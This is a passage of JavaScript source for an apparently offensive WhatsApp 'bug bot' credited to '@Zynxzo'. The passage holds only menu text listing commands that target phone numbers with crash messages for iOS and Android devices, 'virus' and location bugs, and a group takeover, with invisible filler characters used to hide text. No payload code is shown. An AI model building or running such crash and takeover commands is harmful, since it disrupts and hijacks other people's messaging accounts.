│${global.simbol} ${prefix}🦖 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}☠️ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}😖 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🥴 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🤯 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}💦 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🖕 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏──╴[ 𝘽𝙐𝙂 𝙑𝙄𝙍𝙏𝙀𝙓 ] ───┓
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx2 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴛᴇx3 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʙʏᴏɴᴇ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴘ-ᴍᴀʙᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴀᴡᴏᴋᴀᴡᴏᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴀɴᴊᴀʏᴍᴀʙᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}1ᴠ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴅᴀʀᴋsɪsᴛᴇᴍ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏──╴[ 𝙆𝙃𝙐𝙎𝙐𝙎 𝙂𝘾 ] ───┓
│${global.simbol} ${prefix}ᴋᴜᴅᴇᴛᴀᴛʜᴘ 
│${global.simbol} ${prefix}ɢᴄᴀᴍᴘᴀs 𝗜𝗗𝗚𝗖
│${global.simbol} ${prefix}ɢᴄᴊᴇʙᴇʜ 𝗜𝗗𝗚𝗖
│${global.simbol} ${prefix}ɢᴀsʙᴜɢɢᴄ 𝗜𝗗𝗚𝗖
│${global.simbol} ${prefix}ɪᴅɢᴄ 𝗟𝗜𝗡𝗞𝗚𝗖
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙑𝙄𝙋 ]╶────┓
│${global.simbol} ${prefix}ʙᴇᴛᴀ-ᴜᴘ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɢʙᴡᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴡᴀᴏʀɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʙᴜsɪɴᴇss 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙄𝙊𝙎 ]╶────┓
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏɪᴘʜᴏɴᴇ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏɪᴏs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɪᴏsᴀᴛᴛᴀᴄᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴋɪʟʟɪᴏs 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏──╴[ 𝘽𝙐𝙂 𝘼𝙉𝘿𝙍𝙊 ]╶──┓
│${global.simbol} ${prefix}sᴀᴍsᴜɴɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴏᴘᴘᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪᴠᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɪɴғɪɴɪx 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}xɪᴏᴍɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʀᴇᴀʟᴍɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴇɴᴏᴠᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴍᴇɪᴢᴜ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɴᴏᴋɪᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}sᴏɴʏ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴀʟʟᴅᴇᴠɪᴄ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙋𝙍𝙄𝘽 ]╶───┓
│${global.simbol} ${prefix}ᴛᴇs 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}ʜᴀʟᴏ 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}ᴡᴏɪ 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}ʜᴇᴍ 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}=. 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}👽 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}💀 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}💔 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}🙊 𝗧𝗶𝗺𝗲
│${global.simbol} ${prefix}😷 𝗧𝗶𝗺𝗲
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙇𝙊𝘾 ] ────┓
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ2 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴏᴋᴀsɪ3 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙑𝙄𝙍𝙐𝙎 ]╶──┓
│${global.simbol} ${prefix}ᴠɪʀᴜsʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴜsᴊɪᴅ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴀᴜᴅ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʟᴇᴍʙᴜ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴘʜɪʟɪᴘs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ɢᴀsʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴘᴀɴᴀsᴏɴɪᴄ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
  ┏───────────────┓
  │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  ┗───────────────┛`)
}
break
//=================================================//
case 'bugmenu': {
await loading()
zreply(`┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───────────────────┓
│ 𝐎𝐰𝐧𝐞𝐫 : *${global.NamaOwner}*
│ 𝐁𝐨𝐭𝐧𝐚𝐦𝐞 : *${global.namabot}*
│ 𝐔𝐬𝐞𝐫 : ${isPremium ? '𝗩𝗶𝗽' : '𝗙𝗿𝗲𝗲' }
│ 𝐌𝐨𝐝𝐞 : 𝗣𝗿𝗶𝘃𝗮𝘁𝗲
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟳.𝟬
│ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝗢𝗻𝗹𝗶𝗻𝗲
│ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
╰┓ 𝐋𝐢𝐛𝐫𝐚𝐲 : 𝗕𝗮𝗶𝗹𝘆𝘀 - 𝗦𝗼𝗰𝗸𝗲𝘁
   ┗──────────────────┛
┏───╴[ 𝙇𝙄𝙎𝙏 𝘽𝙐𝙂 ]╶───┓
│${global.simbol} ${prefix}ʙᴜɢ-ᴏᴡɴᴇʀ
│${global.simbol} ${prefix}ʙᴜɢ-ᴍᴜʀʙᴜɢ
┗────────────────┛
  ┏───────────────┓
  │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  ┗───────────────┛`)
}
break
//=================================================//
case 'bug-owner': {
await loading()
zreply(`┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏